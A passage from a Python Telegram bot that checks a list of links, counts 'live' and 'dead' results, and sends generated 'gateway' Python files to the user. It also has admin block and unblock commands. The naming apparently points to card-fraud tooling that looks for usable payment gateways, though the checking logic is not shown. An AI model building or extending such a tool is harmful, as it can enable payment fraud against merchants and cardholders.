                        try:
                            bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                            last_text = text
                        except:
                            pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            result = check_single_link(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    try:
                        code = generate_gateway_file(result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        with open(file_name, 'rb') as f:
                            bot.send_document(chat_id, f, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Respons:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr""", parse_mode="HTML")
                        os.remove(file_name)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            time.sleep(0.5)
        
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=2)
        
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
        
        try:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            bot.send_message(chat_id, final_text, parse_mode="HTML")
        
        if user_id in processing_status:
            del processing_status[user_id]
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# === نظام الحظر ===
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
    except:
        bot.reply_to(message, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        bot.reply_to(message, "Usage: /unblock2 [user_id]")

# === تشغيل البوت ===
print('✅ Bot is running...')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(5)
